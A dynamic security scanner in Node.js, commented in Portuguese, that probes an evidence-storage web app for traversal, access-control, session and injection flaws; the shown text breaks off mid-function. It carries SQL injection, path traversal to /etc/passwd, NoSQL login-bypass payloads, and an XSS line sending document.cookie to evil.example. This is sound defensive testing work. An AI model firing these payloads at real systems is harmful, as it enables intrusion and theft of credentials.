/* Varredura dinâmica (DAST): ataca o sistema em execução.
 *
 *   node dast.js                                  sobe um alvo local e roda tudo
 *   node dast.js https://audiprint.up.railway.app  só o que não escreve nada
 *
 * Por que existe, sendo que já tem teste-cofre.js: aquele pergunta "o
 * caminho certo funciona?". Este pergunta "o caminho errado é recusado?", e
 * são perguntas diferentes. O CodeQL lê o código e não sabe que o servidor
 * roda atrás de um proxy; este roda contra o processo de verdade, com
 * cabeçalho forjado, id de outro cliente, payload de injeção e caminho com
 * ../ dentro.
 *
 * Sem dependência: um scanner de segurança que precisa instalar meio mundo
 * vira o ponto mais frágil do que ele deveria proteger. Sem navegador
 * também: nada aqui depende de renderizar página.
 *
 * O que ele NÃO faz, e é honesto dizer: não descobre falha de lógica que
 * ninguém previu, não substitui pentest de gente, e contra alvo externo só
 * roda as sondas que não gravam nada.
 */
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

const ALVO = process.argv[2] && /^https?:\/\//.test(process.argv[2])
  ? process.argv[2].replace(/\/+$/, '') : null;
const PORTA = 8991;
const PORTA_FREIO = 8992;
const BASE = ALVO || 'http://127.0.0.1:' + PORTA;
const HTTPS = BASE.startsWith('https:');

const PIXEL = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';

/* ---------------------------------------------------------------- achados */

const PESO = { critica: 0, alta: 1, media: 2, baixa: 3 };
const achados = [];
let sondas = 0;

function achado(gravidade, titulo, detalhe) {
  achados.push({ gravidade, titulo, detalhe: String(detalhe) });
  console.log('  ACHADO  [' + gravidade + '] ' + titulo);
  console.log('            ' + String(detalhe).split('\n')[0].slice(0, 160));
}

/* Uma sonda que explode não é "passou": é uma sonda que não mediu nada, e
 * silenciar isso é como ter o alarme desligado e o painel verde. */
async function sonda(nome, fn) {
  sondas++;
  const antes = achados.length;
  try {
    await fn();
  } catch (err) {
    achado('media', 'sonda não concluiu: ' + nome, err && err.message);
  }
  if (achados.length === antes) console.log('  ok      ' + nome);
}

/* ------------------------------------------------------- cliente e escuta */

/* Rastro de execução em resposta é mapa da casa: caminho de arquivo, nome de
 * biblioteca e número de linha dizem a quem está sondando exatamente onde
 * bater. Isto vigia TODA resposta da varredura, não uma rota escolhida. */
const RASTRO = [
  [/\bat\s+[\w.<>]+\s+\([^)]*\.js:\d+:\d+\)/, 'pilha de execução'],
  [/(?:\/home\/|\/app\/|\/usr\/lib\/|[A-Za-z]:\\\\?Users\\\\?)/, 'caminho de arquivo do servidor'],
  [/node_modules[\/\\]/, 'caminho de dependência'],
  /* Sem o /i, e com a lista fechada: "sqlite_master" é palavra dos payloads
   * que esta varredura manda, e ela voltava no eco do campo gravado. Um
   * scanner que encontra a própria munição gasta o tempo de quem lê. */
  [/SQLITE_(ERROR|CONSTRAINT|BUSY|CORRUPT|MISUSE|CANTOPEN|READONLY|IOERR|FULL|NOTADB)/,
    'erro cru do banco'],
  [/no such table|syntax error near|unrecognized token/i, 'erro cru do banco']
];

function farejar(caminho, status, tipo, texto) {
  const corpoDeErro = status >= 500 || /json/i.test(tipo || '');
  if (!corpoDeErro || !texto) return;
  for (const [re, oque] of RASTRO) {
    if (re.test(texto)) {
      achado('media', 'resposta entrega ' + oque,
        caminho + ' respondeu ' + status + ': ' + texto.slice(0, 200));
      return;
    }
  }
}

function navegador() {
  const potes = new Map();
  return {
    potes,
    limpar() { potes.clear(); },
    async pedir(caminho, opcoes) {
      const o = Object.assign({ redirect: 'manual' }, opcoes || {});
      o.headers = Object.assign({}, o.headers || {});
      if (potes.size) o.headers.cookie = [...potes].map(([k, v]) => k + '=' + v).join('; ');
      if (o.json !== undefined) {
        o.headers['Content-Type'] = 'application/json';
        o.body = JSON.stringify(o.json);
        delete o.json;
      }
      const r = await fetch(BASE + caminho, o);
      const set = r.headers.getSetCookie ? r.headers.getSetCookie() : [];
      for (const c of set) {
        const [par] = c.split(';');
        const i = par.indexOf('=');
        const nome = par.slice(0, i).trim();
        const valor = par.slice(i + 1).trim();
        if (!valor) potes.delete(nome); else potes.set(nome, valor);
      }
      const texto = await r.text();
      farejar(caminho, r.status, r.headers.get('content-type'), texto);
      let corpo = null;
      try { corpo = JSON.parse(texto); } catch (e) { corpo = texto; }
      return { status: r.status, corpo, texto, headers: r.headers, setCookie: set };
    }
  };
}

const anon = navegador();
const cab = (r, n) => r.headers.get(n) || '';

/* ------------------------------------------------------- mapa de ataque */

const OCULTOS = [
  '/servidor.js', '/cofre/banco.js', '/cofre/contas.js', '/cofre/api.js',
  '/package.json', '/package-lock.json', '/.env', '/.env.example',
  '/.git/config', '/.git/HEAD', '/cofre.db', '/Dockerfile', '/admin.js',
  '/node_modules/.package-lock.json'
];

/* Cada variante existe porque alguma implementação já caiu nela: a crua, a
 * codificada uma vez, a codificada duas, e a que espera um replace ingênuo
 * de "../" que deixa "..././" virar "../". */
const TRAVESSIA = [
  '/../servidor.js',
  '/..%2fservidor.js',
  '/%2e%2e%2fservidor.js',
  '/%252e%252e%252fservidor.js',
  '/....//servidor.js',
  '/publico/../../servidor.js',
  '/..%5cservidor.js',
  '/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
];

const SQL = [
  "' OR '1'='1",
  "'; DROP TABLE projetos;--",
  "' UNION SELECT sql,1,1,1 FROM sqlite_master--",
  '" OR 1=1--',
  "%' AND '1'='1",
  "1' AND (SELECT count(*) FROM usuarios)>0--"
];

/* Rotas que respondem sem sessão, e por quê. Qualquer outra que responda 200
 * para anônimo é o achado. */
const PUBLICAS = new Set([
  'POST /api/entrar', 'POST /api/cadastrar', 'GET /api/cadastro',
  'POST /api/sso/inicio', 'GET /api/sso/retorno', 'POST /api/sso/retorno',
  'POST /api/sair', 'GET /api/eu'
]);

const PROTEGIDAS = [
  ['GET', '/api/projetos'],
  ['POST', '/api/projetos'],
  ['DELETE', '/api/projetos/qualquer'],
  ['GET', '/api/execucoes'],
  ['POST', '/api/execucoes'],
  ['GET', '/api/evidencias'],
  ['POST', '/api/evidencias'],
  ['GET', '/api/evidencias/qualquer'],
  ['DELETE', '/api/evidencias/qualquer'],
  ['GET', '/api/objetos/qualquer'],
  ['HEAD', '/api/objetos/qualquer'],
  ['GET', '/api/objetos/qualquer/link'],
  ['GET', '/api/auditoria'],
  ['GET', '/api/convites'],
  ['POST', '/api/convites'],
  ['POST', '/api/trocar-equipe'],
  ['POST', '/api/equipes'],
  ['GET', '/api/segmentos'],
  ['POST', '/api/segmentos'],
  ['POST', '/api/segmentos/renomear'],
  ['POST', '/api/segmentos/excluir'],
  ['GET', '/api/seguranca'],
  ['GET', '/api/provas'],
  ['POST', '/api/prova'],
  ['POST', '/api/tenant/excluir-tudo']
];

/* ------------------------------------------------- sondas de qualquer alvo */

async function sondasAbertas() {
  console.log('\nsuperfície aberta\n');

  await sonda('cabeçalhos de segurança na página', async () => {
    const r = await anon.pedir('/cofre.html');
    if (r.status !== 200) return achado('baixa', 'página de entrada não respondeu', r.status);
    if (!/nosniff/i.test(cab(r, 'x-content-type-options'))) {
      achado('media', 'sem X-Content-Type-Options',
        'o navegador adivinha o tipo e roda como script o que não é script');
    }
    const csp = cab(r, 'content-security-policy');
    if (!/frame-ancestors\s+'none'/.test(csp)) {
      achado('alta', 'sem frame-ancestors', 'a tela pode ser embutida em iframe: clickjacking no login');
    }
    if (!/object-src\s+'none'/.test(csp)) achado('baixa', 'CSP sem object-src', csp || '(vazio)');
    if (!cab(r, 'referrer-policy')) {
      achado('baixa', 'sem Referrer-Policy', 'o endereço interno vaza para quem receber o clique');
    }
    if (HTTPS && !/max-age=\d{7,}/.test(cab(r, 'strict-transport-security'))) {
      achado('alta', 'sem HSTS em https', 'a primeira visita continua rebaixável para http');
    }
  });

  /* Um Server com o nome da borda é da hospedagem, e não nosso: não dá para
   * tirar e não diz nada de útil a quem ataca. O que interessa é versão,
   * que casa com CVE de linha, e X-Powered-By, que nomeia a pilha. */
  await sonda('servidor não se anuncia', async () => {
    const r = await anon.pedir('/ping');
    for (const h of ['x-powered-by', 'x-aspnet-version']) {
      if (cab(r, h)) achado('baixa', 'cabeçalho ' + h + ' entrega a pilha', cab(r, h));
    }
    if (/\d+\.\d+/.test(cab(r, 'server'))) {
      achado('baixa', 'cabeçalho server entrega a versão', cab(r, 'server'));
    }
  });

  await sonda('arquivo interno não é servido', async () => {
    for (const alvo of OCULTOS) {
      const r = await anon.pedir(alvo);
      if (r.status === 200) achado('critica', 'arquivo interno servido: ' + alvo, r.texto.slice(0, 120));
    }
  });

  await sonda('travessia de caminho não sai da pasta pública', async () => {
    for (const alvo of TRAVESSIA) {
      let r;
      try { r = await anon.pedir(alvo); } catch (e) { continue; }   // URL recusada já na porta
      if (r.status === 200 && /require\(|process\.env|root:x:/.test(r.texto)) {
        achado('critica', 'travessia de caminho funciona: ' + alvo, r.texto.slice(0, 120));
      }
    }
  });

  await sonda('rota protegida recusa anônimo', async () => {
    for (const [metodo, caminho] of PROTEGIDAS) {
      const r = await anon.pedir(caminho, { method: metodo, json: metodo === 'GET' || metodo === 'HEAD' ? undefined : {} });
      if (r.status === 200 || r.status === 201) {
        achado('critica', 'rota aberta sem sessão: ' + metodo + ' ' + caminho, JSON.stringify(r.corpo).slice(0, 160));
      } else if (r.status >= 500) {
        achado('media', 'rota quebra com anônimo: ' + metodo + ' ' + caminho, r.status + ' ' + r.texto.slice(0, 120));
      }
    }
  });

  await sonda('anônimo em /api/eu não recebe identidade', async () => {
    const r = await anon.pedir('/api/eu');
    if (r.corpo && r.corpo.autenticado) achado('critica', '/api/eu autentica sem cookie', JSON.stringify(r.corpo).slice(0, 160));
    if (r.corpo && (r.corpo.email || r.corpo.tenantId)) {
      achado('alta', '/api/eu vaza dado para anônimo', JSON.stringify(r.corpo).slice(0, 160));
    }
  });

  /* Sem TRACE: o fetch do Node recusa o método antes de sair, e o servidor
   * não devolve o pedido em resposta nenhuma, então o eco de cabeçalho não
   * tem por onde acontecer aqui. */
  await sonda('método inesperado não passa', async () => {
    for (const m of ['PUT', 'PATCH', 'DELETE', 'OPTIONS']) {
      const r = await anon.pedir('/api/projetos', { method: m });
      if (r.status === 200 || r.status === 201) {
        achado('alta', m + ' /api/projetos respondeu ' + r.status, r.texto.slice(0, 120));
      }
    }
  });

  await sonda('CORS não abre para origem qualquer', async () => {
    const mal = 'https://evil.example';
    for (const alvo of ['/api/eu', '/ping', '/api/projetos']) {
      const r = await anon.pedir(alvo, { headers: { Origin: mal } });
      const permitida = cab(r, 'access-control-allow-origin');
      const comCredencial = /true/i.test(cab(r, 'access-control-allow-credentials'));
      if (permitida === mal) achado('critica', 'CORS reflete origem hostil em ' + alvo, permitida);
      if (permitida === '*' && comCredencial) achado('critica', 'CORS * com credencial em ' + alvo, permitida);
    }
    const pre = await anon.pedir('/api/projetos', {
      method: 'OPTIONS',
      headers: { Origin: mal, 'Access-Control-Request-Method': 'POST' }
    });
    if (cab(pre, 'access-control-allow-origin') === mal) {
      achado('critica', 'pré-voo aceita origem hostil', cab(pre, 'access-control-allow-origin'));
    }
  });

  await sonda('http é empurrado para https', async () => {
    /* Contra alvo publicado, forjar X-Forwarded-Proto não mede nada: a borda
     * reescreve o cabeçalho com o protocolo real da conexão, e a resposta
     * seria sempre "não redirecionou". A pergunta se faz chegando por http
     * de verdade. No alvo local não existe borda, e o cabeçalho é o único
     * jeito de dizer "cheguei em claro". */
    let status, destino;
    if (HTTPS) {
      const r = await fetch(BASE.replace(/^https:/, 'http:') + '/cofre.html', { redirect: 'manual' });
      await r.text();
      status = r.status;
      destino = r.headers.get('location') || '';
    } else {
      const r = await anon.pedir('/cofre.html', { headers: { 'X-Forwarded-Proto': 'http' } });
      status = r.status;
      destino = cab(r, 'location');
    }
    if (status !== 301 && status !== 302 && status !== 307 && status !== 308) {
      achado('alta', 'http não redireciona', 'respondeu ' + status + ', o cookie viaja em claro');
      return;
    }
    if (!/^https:/.test(destino)) achado('alta', 'redireciona para fora de https', destino || '(sem Location)');
  });

  await sonda('/ping não entrega detalhe de dentro', async () => {
    const r = await anon.pedir('/ping');
    for (const campo of ['modelo', 'base', 'agenteVar', 'agenteVars']) {
      if (r.corpo && r.corpo[campo] !== undefined) {
        achado('media', '/ping expõe ' + campo, JSON.stringify(r.corpo[campo]).slice(0, 120));
      }
    }
  });

  await sonda('host forjado não vira redirecionamento aberto', async () => {
    const r = await anon.pedir('/cofre.html', {
      headers: { 'X-Forwarded-Proto': 'http', 'X-Forwarded-Host': 'evil.example' }
    });
    const destino = cab(r, 'location');
    if (destino && /evil\.example/.test(destino)) {
      achado('alta', 'Host do pedido decide o destino do redirecionamento', destino);
    }
  });

  await sonda('CRLF no endereço não injeta cabeçalho', async () => {
    const r = await anon.pedir('/api/sso/retorno?error=' + encodeURIComponent('x\r\nSet-Cookie: cofre=roubado'));
    const cookies = (r.setCookie || []).join(' ');
    if (/roubado/.test(cookies)) achado('critica', 'injeção de cabeçalho pelo parâmetro de erro', cookies);
    const destino = cab(r, 'location');
    if (destino && !destino.startsWith('/')) achado('alta', 'retorno do provedor manda para fora', destino);
  });
}

/* ------------------------------------------- sondas que precisam de sessão */

async function sondasAutenticadas(sementes) {
  const { alvoA, alvoB, senha } = sementes;

  console.log('\nsessão e cookie\n');

  const nA = navegador();
  const nB = navegador();

  await sonda('cookie de sessão sai trancado', async () => {
    const r = await nA.pedir('/api/entrar', { method: 'POST', json: { email: alvoA.admin, senha } });
    if (r.status !== 200) throw new Error('não entrou: ' + r.status + ' ' + r.texto.slice(0, 120));
    const c = (r.setCookie || []).join(' ');
    if (!/HttpOnly/i.test(c)) achado('critica', 'cookie sem HttpOnly', 'script na página lê o token de sessão');
    if (!/SameSite=(Lax|Strict)/i.test(c)) achado('alta', 'cookie sem SameSite', c.slice(0, 120));
    if (!/Path=\//i.test(c)) achado('baixa', 'cookie sem Path', c.slice(0, 120));
  });

  await sonda('cookie ganha Secure quando a borda é https', async () => {
    const n = navegador();
    const r = await n.pedir('/api/entrar', {
      method: 'POST', headers: { 'X-Forwarded-Proto': 'https' },
      json: { email: alvoA.admin, senha }
    });
    const c = (r.setCookie || []).join(' ');
    if (!/Secure/i.test(c)) achado('alta', 'cookie sem Secure em https', c.slice(0, 120));
  });

  await sonda('token de sessão não é adivinhável', async () => {
    const bom = nA.potes.get('cofre');
    if (!bom) throw new Error('sem cookie para comparar');
    if (decodeURIComponent(bom).length < 32) {
      achado('alta', 'token de sessão curto demais', decodeURIComponent(bom).length + ' caracteres');
    }
    const forjados = [
      '1', 'admin', bom.slice(0, -1) + 'a', crypto.randomBytes(24).toString('hex'),
      Buffer.from(alvoA.admin).toString('base64')
    ];
    for (const f of forjados) {
      const n = navegador();
      const r = await n.pedir('/api/projetos', { headers: { cookie: 'cofre=' + f } });
      if (r.status === 200) achado('critica', 'cookie forjado entrou', f.slice(0, 24));
    }
  });

  await sonda('login troca o identificador de sessão', async () => {
    const n = navegador();
    await n.pedir('/api/cadastro', { headers: { cookie: 'cofre=fixado-por-terceiro' } });
    const r = await n.pedir('/api/entrar', {
      method: 'POST', headers: { cookie: 'cofre=fixado-por-terceiro' },
      json: { email: alvoA.admin, senha }
    });
    const novo = (r.setCookie || []).join(' ');
    if (!novo || /cofre=fixado-por-terceiro/.test(novo)) {
      achado('alta', 'sessão fixada sobrevive ao login', novo.slice(0, 120) || '(sem Set-Cookie)');
    }
  });

  await sonda('sair mata o cookie de verdade', async () => {
    const n = navegador();
    await n.pedir('/api/entrar', { method: 'POST', json: { email: alvoA.admin, senha } });
    const usado = n.potes.get('cofre');
    await n.pedir('/api/sair', { method: 'POST' });
    const r = await navegador().pedir('/api/projetos', { headers: { cookie: 'cofre=' + usado } });
    if (r.status === 200) achado('critica', 'cookie continua valendo depois de sair', 'sessão não foi revogada');
  });

  await sonda('não dá para saber se o e-mail existe', async () => {
    const n = navegador();
    const existe = await n.pedir('/api/entrar', { method: 'POST', json: { email: alvoA.isca, senha: 'errada-de-proposito' } });
    const naoExiste = await n.pedir('/api/entrar', { method: 'POST', json: { email: 'ninguem-' + Date.now() + '@exemplo.com', senha: 'errada-de-proposito' } });
    if (existe.status !== naoExiste.status) {
      achado('media', 'status diferente para conta que existe',
        existe.status + ' contra ' + naoExiste.status + ': dá para varrer e-mail válido');
    }
    const a = JSON.stringify(existe.corpo), b = JSON.stringify(naoExiste.corpo);
    if (a !== b) achado('media', 'mensagem diferente para conta que existe', a + ' contra ' + b);
  });

  console.log('\nisolamento entre clientes\n');

  await nB.pedir('/api/entrar', { method: 'POST', json: { email: alvoB.admin, senha } });

  /* O ataque real: B sabe o id de A (veio num relatório, num print, num
   * link colado no chat) e tenta usar com a própria sessão, que é válida. */
  await sonda('id de outro cliente não devolve nada', async () => {
    const alvos = [
      ['GET', '/api/evidencias/' + alvoA.evidenciaId],
      ['DELETE', '/api/evidencias/' + alvoA.evidenciaId],
      ['DELETE', '/api/projetos/' + alvoA.projetoId],
      ['GET', '/api/objetos/' + alvoA.objetoId],
      ['GET', '/api/objetos/' + alvoA.objetoId + '/link']
    ];
    for (const [metodo, caminho] of alvos) {
      const r = await nB.pedir(caminho, { method: metodo });
      if (r.status === 200) achado('critica', 'cliente B alcançou ' + metodo + ' ' + caminho, r.texto.slice(0, 120));
    }
  });

  await sonda('filtro por id alheio não traz lista de outro', async () => {
    const r = await nB.pedir('/api/execucoes?projeto=' + alvoA.projetoId);
    const lista = (r.corpo && r.corpo.execucoes) || [];
    if (lista.length) achado('critica', 'execuções de outro cliente listadas', JSON.stringify(lista).slice(0, 160));
    const e = await nB.pedir('/api/evidencias?execucao=' + alvoA.execucaoId);
    if (((e.corpo && e.corpo.evidencias) || []).length) {
      achado('critica', 'evidências de outro cliente listadas', JSON.stringify(e.corpo).slice(0, 160));
    }
  });

  await sonda('auditoria não atravessa cliente', async () => {
    const r = await nB.pedir('/api/auditoria');
    const txt = JSON.stringify((r.corpo && r.corpo.eventos) || []);
    if (txt.includes(alvoA.projetoId) || txt.includes(alvoA.admin)) {
      achado('critica', 'auditoria de B mostra evento de A', txt.slice(0, 160));
    }
  });

  await sonda('trocar de equipe só vai para equipe alcançável', async () => {
    const r = await nB.pedir('/api/trocar-equipe', { method: 'POST', json: { tenantId: alvoA.tenantId } });
    if (r.status === 200) achado('critica', 'B trocou para a equipe de A', JSON.stringify(r.corpo).slice(0, 160));
  });

  await sonda('link assinado não aceita remendo', async () => {
    const r = await nA.pedir('/api/objetos/' + alvoA.objetoId + '/link');
    if (r.status !== 200) throw new Error('não consegui um link: ' + r.status);
    const url = r.corpo.url;
    const remendos = [
      url.replace(/t=[^&]*/, 't=' + encodeURIComponent(alvoB.tenantId)),
      url.replace(/ate=\d+/, 'ate=' + (Date.now() + 31536000000)),
      url.replace(/a=[^&]*/, 'a=' + crypto.randomBytes(32).toString('base64url')),
      url.replace(/a=/, 'a='),                       // controle: este tem de funcionar
      url.split('?')[0] + '?t=' + alvoA.tenantId + '&ate=' + (Date.now() + 60000) + '&a='
    ];
    for (let i = 0; i < remendos.length; i++) {
      const rr = await navegador().pedir(remendos[i]);
      const deveriaPassar = i === 3;
      if (deveriaPassar && rr.status !== 200) achado('media', 'link legítimo recusado', rr.status + ' ' + rr.texto.slice(0, 80));
      if (!deveriaPassar && rr.status === 200) achado('critica', 'link adulterado entregou o objeto', remendos[i].slice(0, 120));
    }
  });

  await sonda('link vencido não entrega objeto', async () => {
    const vencido = '/api/objetos/' + alvoA.objetoId + '?t=' + encodeURIComponent(alvoA.tenantId)
      + '&ate=' + (Date.now() - 1000) + '&a=' + crypto.randomBytes(32).toString('base64url');
    const r = await navegador().pedir(vencido);
    if (r.status === 200) achado('critica', 'link vencido continua valendo', vencido.slice(0, 120));
  });

  console.log('\npapel e campo escondido\n');

  const nLeitor = navegador();
  const nConsultor = navegador();
  const nGestor = navegador();
  await nLeitor.pedir('/api/entrar', { method: 'POST', json: { email: alvoA.leitor, senha } });
  await nConsultor.pedir('/api/entrar', { method: 'POST', json: { email: alvoA.consultor, senha } });
  await nGestor.pedir('/api/entrar', { method: 'POST', json: { email: alvoA.gestor, senha } });

  await sonda('papel de baixo não faz o que é de cima', async () => {
    const tentativas = [
      [nLeitor, 'POST', '/api/projetos', { nome: 'do leitor' }, 'leitor cria projeto'],
      [nLeitor, 'POST', '/api/evidencias', { execucaoId: alvoA.execucaoId }, 'leitor grava evidência'],
      [nConsultor, 'DELETE', '/api/projetos/' + alvoA.projetoId, undefined, 'consultor apaga projeto'],
      [nConsultor, 'POST', '/api/convites', { papel: 'admin' }, 'consultor convida'],
      [nGestor, 'POST', '/api/tenant/excluir-tudo', { confirmar: 'sim' }, 'gestor apaga o cliente inteiro']
    ];
    for (const [n, metodo, caminho, corpo, oque] of tentativas) {
      const r = await n.pedir(caminho, { method: metodo, json: corpo });
      if (r.status === 200 || r.status === 201) achado('alta', 'escalonamento de papel: ' + oque, r.texto.slice(0, 120));
    }
  });

  await sonda('ninguém convida para papel acima do próprio', async () => {
    const r = await nGestor.pedir('/api/convites', { method: 'POST', json: { papel: 'admin' } });
    if (r.status === 201) achado('alta', 'gestor gerou convite de admin', JSON.stringify(r.corpo).slice(0, 120));
  });

  /* Campo que a tela nunca manda, mandado assim mesmo: é como um id de dono
   * vira coluna gravada em sistema que confia no corpo do pedido. */
  await sonda('campo a mais no corpo é ignorado', async () => {
    const r = await nA.pedir('/api/projetos', {
      method: 'POST',
      json: {
        nome: 'sonda de campo a mais', cliente: 'x',
        tenant_id: alvoB.tenantId, tenantId: alvoB.tenantId,
        id: 'id-escolhido-pelo-cliente', criado_por: 'outro', papel: 'admin',
        expira_em: 0, estado: 'eterno'
      }
    });
    if (r.status !== 201) throw new Error('não criou: ' + r.status + ' ' + r.texto.slice(0, 100));
    const criado = r.corpo.projeto.id;
    if (criado === 'id-escolhido-pelo-cliente') achado('alta', 'o cliente escolheu o id do registro', criado);
    const doB = await nB.pedir('/api/projetos');
    const listaB = JSON.stringify((doB.corpo && doB.corpo.projetos) || []);
    if (listaB.includes(criado) || listaB.includes('sonda de campo a mais')) {
      achado('critica', 'tenant_id do corpo mudou o dono do registro', listaB.slice(0, 160));
    }
    const doA = await nA.pedir('/api/projetos');
    if (!JSON.stringify(doA.corpo.projetos).includes(criado)) {
      achado('alta', 'o registro sumiu do dono verdadeiro', criado);
    }
  });

  await sonda('protótipo não é poluído pelo JSON', async () => {
    await nA.pedir('/api/projetos', {
      method: 'POST',
      json: JSON.parse('{"nome":"proto","__proto__":{"papelForcado":"admin"},"constructor":{"prototype":{"x":1}}}')
    });
    const r = await nA.pedir('/api/eu');
    if (r.corpo && r.corpo.papelForcado) achado('critica', 'poluição de protótipo pegou', JSON.stringify(r.corpo).slice(0, 160));
    const vivo = await nA.pedir('/api/projetos');
    if (vivo.status !== 200) achado('alta', 'servidor ficou estranho depois do __proto__', vivo.status);
  });

  console.log('\ninjeção e conteúdo\n');

  await sonda('injeção de SQL não muda a consulta', async () => {
    for (const payload of SQL) {
      const criado = await nA.pedir('/api/projetos', { method: 'POST', json: { nome: payload, cliente: payload } });
      if (criado.status >= 500) {
        achado('alta', 'payload de SQL derrubou a rota', payload + ' -> ' + criado.status);
        continue;
      }
      /* Gravado como texto, e não interpretado: o nome tem de voltar igual. */
      if (criado.status === 201 && criado.corpo.projeto.nome !== payload.trim()) {
        achado('baixa', 'o campo voltou diferente do que entrou', payload + ' -> ' + criado.corpo.projeto.nome);
      }
      const busca = await nA.pedir('/api/execucoes?projeto=' + encodeURIComponent(payload));
      if (busca.status >= 500) achado('alta', 'payload de SQL na query derrubou a rota', payload + ' -> ' + busca.status);
      if (((busca.corpo && busca.corpo.execucoes) || []).length) {
        achado('critica', 'filtro com payload devolveu linhas', payload);
      }
    }
    /* A tabela sobreviveu ao DROP: se não sobreviveu, nada abaixo funciona. */
    const depois = await nA.pedir('/api/projetos');
    if (depois.status !== 200) achado('critica', 'a listagem parou depois dos payloads', depois.status + ' ' + depois.texto.slice(0, 120));
  });

  await sonda('conteúdo do usuário volta como dado, não como página', async () => {
    const veneno = '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">';
    const p = await nA.pedir('/api/projetos', { method: 'POST', json: { nome: veneno } });
    if (p.status !== 201) throw new Error('não criou: ' + p.status);
    const lista = await nA.pedir('/api/projetos');
    if (/text\/html/i.test(cab(lista, 'content-type'))) {
      achado('critica', 'a API devolve HTML com conteúdo do usuário', cab(lista, 'content-type'));
    }
    if (!/nosniff/i.test(cab(lista, 'x-content-type-options'))) {
      achado('alta', 'resposta da API sem nosniff', 'o navegador pode tratar o JSON como HTML');
    }
  });

  await sonda('quebra de linha em campo não vira cabeçalho', async () => {
    const r = await nA.pedir('/api/projetos', {
      method: 'POST',
      json: { nome: 'a\r\nSet-Cookie: cofre=roubado\r\nX-Injetado: 1', cliente: 'b\nLocation: https://evil.example' }
    });
    const brutos = [...r.headers].map(([k, v]) => k + ': ' + v).join('\n');
    if (/roubado|X-Injetado/i.test(brutos)) achado('critica', 'campo do usuário virou cabeçalho de resposta', brutos.slice(0, 160));
  });

  await sonda('arquivo fora da lista não é aceito', async () => {
    const proibidos = [
      'data:image/svg+xml;base64,' + Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>').toString('base64'),
      'data:text/html;base64,' + Buffer.from('<script>alert(1)</script>').toString('base64'),
      'data:application/x-msdownload;base64,TVqQAAMAAAAEAAAA',
      'data:image/png;base64,' + Buffer.from('<script>alert(1)</script>').toString('base64') + '#renomeado'
    ];
    for (const dado of proibidos) {
      const r = await nA.pedir('/api/evidencias', {
        method: 'POST', json: { execucaoId: alvoA.execucaoId, titulo: 'sonda', antes: dado }
      });
      const tipo = /^data:([^;]+)/.exec(dado)[1];
      if (r.status === 201 && tipo !== 'image/png') {
        achado('alta', 'tipo fora da lista foi aceito: ' + tipo, r.texto.slice(0, 120));
      }
    }
  });

  await sonda('corpo gigante é cortado, e o servidor continua de pé', async () => {
    const gigante = 'data:image/png;base64,' + 'A'.repeat(30 * 1024 * 1024);
    try {
      const r = await nA.pedir('/api/evidencias', {
        method: 'POST', json: { execucaoId: alvoA.execucaoId, antes: gigante }
      });
      if (r.status === 201) achado('alta', 'corpo de 30 MB foi aceito', 'sem teto, memória do servidor é do atacante');
    } catch (e) { /* conexão cortada na porta: é exatamente o esperado */ }
    const vivo = await nA.pedir('/api/projetos');
    if (vivo.status !== 200) achado('critica', 'o servidor não voltou depois do corpo gigante', vivo.status);
  });

  await sonda('corpo malformado não vira 500', async () => {
    const casos = [
      { body: 'email=admin&senha=x', headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
      { body: '{"email":', headers: { 'Content-Type': 'application/json' } },
      { body: '[]', headers: { 'Content-Type': 'application/json' } },
      { body: 'null', headers: { 'Content-Type': 'application/json' } },
      { body: '{"email":{"$ne":null},"senha":{"$ne":null}}', headers: { 'Content-Type': 'application/json' } }
    ];
    for (const c of casos) {
      const r = await nA.pedir('/api/entrar', Object.assign({ method: 'POST' }, c));
      if (r.status >= 500) achado('media', 'corpo malformado derrubou /api/entrar', c.body.slice(0, 40) + ' -> ' + r.status);
      if (r.status === 200) achado('critica', 'corpo malformado autenticou', c.body.slice(0, 60));
    }
  });

  await sonda('cadastro sem convite não entra em equipe existente', async () => {
    const n = navegador();
    const r = await n.pedir('/api/cadastrar', {
      method: 'POST',
      json: {
        email: 'invasor-' + Date.now() + '@exemplo.com', senha: 'senha-bem-longa-9',
        equipe: 'nova', tenantId: alvoA.tenantId, convite: ''
      }
    });
    if (r.status === 201 && r.corpo.sessao && r.corpo.sessao.tenantId === alvoA.tenantId) {
      achado('critica', 'cadastro escolheu a equipe pelo corpo do pedido', JSON.stringify(r.corpo.sessao).slice(0, 160));
    }
  });

  await sonda('convite inventado não é aceito', async () => {
    for (const codigo of ['1', 'aaaaaaaa', crypto.randomBytes(16).toString('hex')]) {
      const r = await navegador().pedir('/api/cadastrar', {
        method: 'POST',
        json: { email: 'chute-' + Date.now() + Math.random() + '@exemplo.com', senha: 'senha-bem-longa-9', convite: codigo }
      });
      if (r.status === 201) achado('critica', 'convite inventado entrou', codigo);
    }
  });
}

/* ---------------------------------------------------- sondas de freio */

/* Servidor próprio, com tetos baixos: medir o freio no alvo principal
 * exigiria milhares de chamadas e envenenaria as outras sondas. */
async function sondasDeFreio(arquivo) {
  console.log('\nfreio de varredura\n');

  const proc = spawn(process.execPath, [path.join(__dirname, 'servidor.js')], {
    env: Object.assign({}, process.env, {
      PORT: String(PORTA_FREIO), HOST: '0.0.0.0',
      COFRE_BANCO: arquivo, COFRE_SEGREDO: 'segredo-de-sonda',
      COFRE_TETO_MINUTO: '15', COFRE_TETO_IP: '20',
      AGENTE_API_KEY: '', PONTE_TOKEN: ''
    }),
    stdio: ['ignore', 'pipe', 'pipe']
  });
  proc.stdout.resume();
  proc.stderr.resume();

  const base = 'http://127.0.0.1:' + PORTA_FREIO;
  const pedir = (caminho, opcoes) => fetch(base + caminho, opcoes || {});
  for (let i = 0; i < 120; i++) {
    try { const r = await pedir('/ping'); if (r.ok) { await r.text(); break; } } catch (e) {}
    await new Promise(r => setTimeout(r, 250));
  }

  try {
    await sonda('sessão não varre a API à vontade', async () => {
      const r = await pedir('/api/entrar', {
        method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '203.0.113.7' },
        body: JSON.stringify({ email: 'admin-freio@exemplo.com', senha: 'senha-bem-longa-1' })
      });
      const set = r.headers.getSetCookie ? r.headers.getSetCookie() : [];
      const cookie = (set[0] || '').split(';')[0];
